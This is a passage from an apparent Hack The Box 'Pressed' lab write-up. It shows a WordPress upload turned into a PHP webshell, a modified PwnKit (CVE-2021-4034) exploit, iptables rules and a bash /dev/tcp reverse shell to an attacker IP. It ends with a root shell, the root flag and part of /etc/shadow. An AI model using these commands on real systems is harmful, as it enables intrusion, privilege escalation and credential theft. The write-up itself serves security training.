  <member><name>link</name><value><string>/wp-content/uploads/2022/02/ws.jpg</string></value></member>
  <member><name>title</name><value><string>ws.jpg</string></value></member>
  <member><name>caption</name><value><string></string></value></member>
  <member><name>description</name><value><string></string></value></member>
  <member><name>metadata</name><value><boolean>0</boolean></value></member>
  <member><name>type</name><value><string>mime/type</string></value></member>
  <member><name>thumbnail</name><value><string>/wp-content/uploads/2022/02/ws.jpg</string></value></member>
  <member><name>id</name><value><string>55</string></value></member>
  <member><name>file</name><value><string>ws.jpg</string></value></member>
  <member><name>url</name><value><string>/wp-content/uploads/2022/02/ws.jpg</string></value></member>
</struct>
      </value>
    </param>
  </params>
</methodResponse>
```

Renaming the webshell:
```
view-source:http://pressed.htb/wp-content/uploads/2022/02/blah.php?cmd=mv%20ws.jpg%20ws.php
```
And accessing it:

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot8-1.png)

# ENUMERATION

Using the webshell we may enumerate the system, running processes, users, file, etc.:

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot8-2.png)

For instance we may check installed software versions by checking out _/var/log/dpkg.log.1_

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot9.png)

# PRIVILEGE ESCALATION AND ROOT FLAG CAPTURE

One of the most recent high-profile LPEs was PwnKit (CVE-2021-4034) found by Qualys with the excellent write-up at https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034. As it's quite new let's test for it using PoC provided by bl4sty and announced on twitter https://twitter.com/bl4sty/status/1486092552755466242?s=20. As we don't have interactive access to the host the PoC should be modified slightly, as it tries to execute _/bin/sh_ which would be of no help to us. Checking man page for _execve_ we see that we can also execute scripts, given they start with the 
```
#!interpreter [optional-arg]
```
notation.

To test our exploit our shell script will execute _id_ and pipe the output to a text file.
```
#!/bin/bash
id>>result
```

Modified blasty.c code should now execute our script _/tmp/blah.sh_ instead of _/bin/sh_
```
# diff blasty.c /tmp/blasty.c
43c43
<         "  execve(\"/bin/sh\", a_argv, a_envp);\n"
---
>         "  execve(\"/tmp/blah.sh\", a_argv, a_envp);\n"
```

With everything ready, we upload _blasty.c_ and _blah.sh_ using our webshell, and copy them to _/tmp_ and compile the code.

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot10.png)

Upon execution of _/tmp/blasty_ we see that the exploit was successfull.

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot11.png)

Next we will try to create a firewall rule that will allow our IP to connect back and forth to the box. For that we will execute
```
/sbin/iptables -A INPUT -p tcp -s 10.10.14.12 -j ACCEPT
/sbin/iptables -A OUTPUT -p tcp -d  10.10.14.12 -j ACCEPT
```

and create reverse shell 
```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/53 0>&1'
```

Final contents of _blah.sh_, upload and copy to _/tmp_
```
#!/bin/bash
id>>result
/sbin/iptables -A INPUT -p tcp -s 10.10.14.12 -j ACCEPT
/sbin/iptables -A OUTPUT -p tcp -d  10.10.14.12 -j ACCEPT
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/53 0>&1'
```

Listener set up on the attacker host:
```
# nc -lvp 53                                                                                                               
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
```

Again execute the PoC:

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot12.png)

And we have a reverse shell hitting our listener:
```
# nc -lvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.11.142.
Ncat: Connection from 10.10.11.142:60888.
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
root@Pressed:/var/www/html/wp-content/uploads/2022/02#
```

The root flag is captured:
```
root@Pressed:/var/www/html/wp-content/uploads/2022/02# cd /root
cd /root
root@Pressed:/root# ls -la
ls -la
total 64
drwx------ 1 root root   172 Feb  3 05:58 .
drwxr-xr-x 1 root root   164 Jul  2  2021 ..
lrwxrwxrwx 1 root root     9 Feb  1 07:10 .bash_history -> /dev/null
-rw-r--r-- 1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x 1 root root    46 Feb  1 05:24 .cache
-rw------- 1 root root    72 Jan 28 17:10 .lesshst
-rw------- 1 root root   914 Jan 28 16:12 .mysql_history
-rw-r--r-- 1 root root   161 Dec  5  2019 .profile
drwx------ 1 root root    94 Jan 30 23:13 .ssh
-rw------- 1 root root 17219 Feb  3 05:58 .viminfo
-rw-r--r-- 1 root root   215 Jan 28 15:22 .wget-hsts
-rw-r--r-- 1 root root    33 Feb  5 15:09 root.txt
root@Pressed:/root# cat root.txt
cat root.txt
9e1d3f02739d50...
# grep root /etc/shadow
grep root /etc/shadow
root:$6$hJ0HfQDh7UcOW7ac$x/sOTOHIBrtSUK....:19024:0:99999:7:::
```



